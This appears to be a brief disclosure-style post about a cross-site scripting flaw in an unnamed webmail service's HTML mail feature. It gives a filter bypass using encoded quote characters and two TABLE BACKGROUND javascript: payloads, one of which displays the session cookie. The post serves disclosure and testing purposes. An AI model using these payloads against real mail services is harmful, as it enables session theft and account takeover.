Sending mail XSS vuln with cookie disclosure:

When sending mail you can enable the option to make a "HTML" email. This should be a no no right off the bat. To bypass their filters still however, we will use a table tag with long UTF-8 uncicode ' so they don't get filtered. For a PoC put the codes below in the body of your mail msg. Make sure "HTML Mail" is checked 

in:

<TABLE BACKGROUND=javascript:alert(&#0000039XSS&#0000039)>

And to get the cookie:
<TABLE BACKGROUND=javascript:alert(document.cookie)>

Img tags work as well. Script tags seem to get filtered out, even with html enabled.
